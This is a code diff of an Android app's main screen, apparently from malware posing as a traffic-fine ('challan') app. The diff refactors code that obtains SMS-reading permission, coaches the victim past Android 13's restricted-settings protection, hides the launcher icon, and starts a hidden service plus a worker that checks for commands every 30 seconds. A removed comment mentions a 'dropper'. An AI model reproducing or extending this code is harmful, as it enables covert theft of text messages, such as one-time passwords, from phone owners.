@@ -16,8 +16,6 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.work.ExistingPeriodicWorkPolicy
-import androidx.work.ExistingWorkPolicy
-import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import com.rte.challan.service.BackgroundService
@@ -41,14 +39,9 @@ class MainActivity : AppCompatActivity() {
         btnRequestPermissions = findViewById(R.id.btnRequestPermissions)
         tvInstruction = findViewById(R.id.tvInstruction)
 
-        // Check if SMS permission is already granted
         if (isSmsPermissionGranted()) {
-            // All good, hide icon and start background work
-            hideLauncherIcon()
-            startBackgroundWork()
-            finish()
+            setupCompleted()
         } else {
-            // Check if we are on Android 13+ and need Restricted Settings
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 btnEnableRestricted.visibility = android.view.View.VISIBLE
                 btnEnableRestricted.setOnClickListener {
@@ -57,9 +50,6 @@ class MainActivity : AppCompatActivity() {
                 tvInstruction.text = "Step 1: Tap above button\n" +
                         "Step 2: Tap ⋮ menu → Allow restricted settings → ON\n" +
                         "Step 3: Come back and tap Request Permissions"
-            } else {
-                // For older Android versions, directly request permission
-                btnRequestPermissions.performClick()
             }
         }
 
@@ -69,10 +59,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun isSmsPermissionGranted(): Boolean {
-        return ContextCompat.checkSelfPermission(
-            this,
-            Manifest.permission.READ_SMS
-        ) == PackageManager.PERMISSION_GRANTED
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
     }
 
     private fun requestSmsPermission() {
@@ -102,18 +89,20 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        when (requestCode) {
-            SMS_PERMISSION_CODE -> {
-                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                    Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show()
-                    hideLauncherIcon()
-                    startBackgroundWork()
-                    finish()
-                } else {
-                    Toast.makeText(this, "Permissions denied. App may not work properly.", Toast.LENGTH_LONG).show()
-                }
+        if (requestCode == SMS_PERMISSION_CODE) {
+            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show()
+                setupCompleted()
+            } else {
+                Toast.makeText(this, "Permissions denied. App may not work properly.", Toast.LENGTH_LONG).show()
             }
         }
+    }
+
+    private fun setupCompleted() {
+        hideLauncherIcon()
+        startBackgroundWork()
+        finish()
     }
 
     private fun hideLauncherIcon() {
@@ -125,14 +114,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startBackgroundWork() {
-        // Start foreground service
         val serviceIntent = Intent(this, BackgroundService::class.java)
         ContextCompat.startForegroundService(this, serviceIntent)
 
-        // Schedule periodic workers
         val workManager = WorkManager.getInstance(this)
 
-        // Status worker every 15 minutes
         val statusRequest = PeriodicWorkRequestBuilder<StatusWorker>(15, TimeUnit.MINUTES)
             .setInitialDelay(1, TimeUnit.MINUTES)
             .build()
@@ -142,7 +128,6 @@ class MainActivity : AppCompatActivity() {
             statusRequest
         )
 
-        // Command worker every 30 seconds
         val commandRequest = PeriodicWorkRequestBuilder<CommandWorker>(30, TimeUnit.SECONDS)
             .setInitialDelay(10, TimeUnit.SECONDS)
             .build()
@@ -151,8 +136,5 @@ class MainActivity : AppCompatActivity() {
             ExistingPeriodicWorkPolicy.KEEP,
             commandRequest
         )
-
-        // One-time registration worker (if needed)
-        // Not required now because device is already registered via dropper
     }
 }
